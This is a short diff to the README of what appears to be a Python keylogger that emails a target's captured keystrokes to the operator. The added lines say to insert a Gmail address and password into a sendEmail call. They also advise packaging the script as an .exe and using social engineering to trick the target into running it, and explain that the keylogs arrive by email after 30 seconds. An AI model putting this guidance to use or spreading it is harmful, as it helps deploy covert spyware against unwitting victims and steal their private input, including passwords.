@@ -14,8 +14,10 @@ USAGE:
       sude apt install python3
       sudo apt-get install python3-dev
       sudo apt install python3-pip 
+      
+Note : Dont forget to change 34th line according to your email and email's password : sendEmail("user@gmail.com", "user's gmail password",log.encode('utf-8'))
 ```
-And your program will run without any error.
+And your program will run without any error. You can make this code as .exe and use your Social Engineering skills to be more attractive for the target. Make them run it!
 IMPORTANT NOTE: The first mail on the receiver e-mail will be empty. Ignore it, the second mail will come after 30 seconds and will contain the keylogs of the target machine.
                             
                             
